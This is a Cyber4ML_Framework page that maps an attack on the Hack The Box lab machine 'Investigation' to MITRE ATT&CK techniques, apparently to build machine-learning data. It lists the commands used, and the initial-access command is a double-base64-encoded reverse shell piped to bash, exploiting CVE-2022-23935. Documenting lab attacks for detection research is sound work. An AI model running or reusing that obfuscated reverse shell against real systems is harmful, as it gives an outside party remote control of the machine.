# Cyber4ML_Framework application in "Investigation" HTB machine

## Framework application details

|Documentation|MITRE ATT&CK|Enterprise|ICS|Network Analysis|Log Analysis|
|-|-|-|-|-|-|
|Yes|Yes|Yes|No|Yes|Yes|

|Attacker Level|Environment|VPN|Attacker IP|Victim IP|
|-|-|-|-|-|
|Average|Linux|Yes|10.10.16.54|10.10.11.197|

**Average:** The knowledge, behavior and attack-timing of the attacker is average.

## Documentation

Documentation of the attack: [Investigation Documentation](https://github.com/stevendamianakis/HackTheBox_Writeups/blob/main/Machines/Investigation/README.MD)

## MITRE ATT&CK mapping

Below, we map the attack to the MITRE ATT&CK Enterprise framework.

| Tactic | Technique | Subtechnique | Command/Script | CVE/CWE |
| Reconnaissance | Gather Victim Host Information | Software | - | - |
| Initial Access | Exploit Public-Facing Application | - | (1) | CVE-2022-23935/CWE-77 |
| Execution | Exploitation for Client Execution | - | (1) | CVE-2022-23935/CWE-77 |
| Discovery | System Owner/User Discovery | - | (2) | - |
| Discovery | File and Directory Discovery | - | (3) | - |
| Persistence | Valid Accounts | Local Accounts | (4) | - |
| Discovery | Permission Groups Discovery | Local Groups | (5) | - |
| Privilege Escalation | Exploitation for Privilege Escalation | - | - |

#### Commands/Scripts
- (1)
```
'WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4Tmk0ek1TODBORFEwSURBK0pqRUsK' | base64 -d | base64 -d | bash |
```

- (2)
```
whoami
```

- (3)
```
find / -type d -iname "invest*" 2>/dev/null
```

- (4)
```
ssh smorton@eforenzics.htb
```

- (5)
```
sudo -l
```

## Network Data

Pcap file of the attack: [Capture File](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/Investigation/attack_capture.pcapng)

## Malicious Log Data
